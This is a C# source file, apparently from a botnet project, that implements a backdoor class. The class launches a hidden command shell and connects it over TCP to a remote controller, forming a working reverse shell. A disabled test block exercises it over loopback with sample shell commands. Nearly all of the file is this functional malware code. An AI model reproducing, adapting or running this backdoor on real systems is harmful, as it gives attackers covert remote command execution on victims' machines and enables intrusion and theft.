using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using TcpClient = System.Net.Sockets.TcpClient;

namespace Vinchuca.Actions.Backdoor
{
    class Backdoor
    {
        private Process _process;
        private static TcpClient _server;
        private readonly IPEndPoint _controllerEndPoint;

        public Backdoor(IPEndPoint controller)
        {
            _controllerEndPoint = controller;
            _server = new TcpClient();
        }

        public void Run()
        {
            LaunchShellProcess();
            _server.Connect(_controllerEndPoint);
            var stream = _server.GetStream();
            StreamUtils.CopyToAsync(stream, _process.StandardInput.BaseStream);
            StreamUtils.CopyToAsync(_process.StandardOutput.BaseStream, stream);
            var waitThread = new Thread(WaitForProcess);
            waitThread.Start();
        }

        private void WaitForProcess()
        {
            _process.WaitForExit();
            _process.Close();
            _server.Close();
        }

        private void LaunchShellProcess()
        {
            var startInfo = new ProcessStartInfo()
            {
                FileName = Environment.GetEnvironmentVariable("COMSPEC") ?? "cmd.exe",
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardInput = true,
                CreateNoWindow = true
            };

            _process = Process.Start(startInfo);
        }
    }

    static class StreamUtils
    {
        public static void CopyToAsync(Stream source, Stream destination)
        {
            ThreadPool.QueueUserWorkItem(s1 =>
            {
                var array = new byte[1024];
                try
                {
                    int count;
                    while ((count = source.Read(array, 0, array.Length)) != 0)
                    {
                        destination.Write(array, 0, count);
                        destination.Flush();
                    }
                }
                catch (Exception e)
                {
                    // ignored
                }
            });
        }
    }

#if false
    public class Test1
    {
        public void tt()
        {
            var port = new Random().Next(33000, 33999);
            var serverEndpoint = new IPEndPoint(IPAddress.Loopback, port);
            var server = new TcpListener(serverEndpoint);
            server.Start();

            var door = new Backdoor(serverEndpoint);
            door.Run();

            var client = server.AcceptTcpClient();
            var stream = client.GetStream();

            var output = new MemoryStream();
            StreamUtils.CopyToAsync(stream, output);

            var writer = new StreamWriter(stream) { AutoFlush = true };
            writer.Write("dir" + Environment.NewLine);
            writer.Write("mkdir test" + Environment.NewLine);
            writer.Write("cd test" + Environment.NewLine);
            writer.Write("echo \"Hello World!!\" >  greeting.txt" + Environment.NewLine);
            writer.Write("exit" + Environment.NewLine);
            Thread.Sleep(500);
            client.Close();
            server.Stop();
            var o = Encoding.ASCII.GetString(output.ToArray());
        }
    }
#endif 
}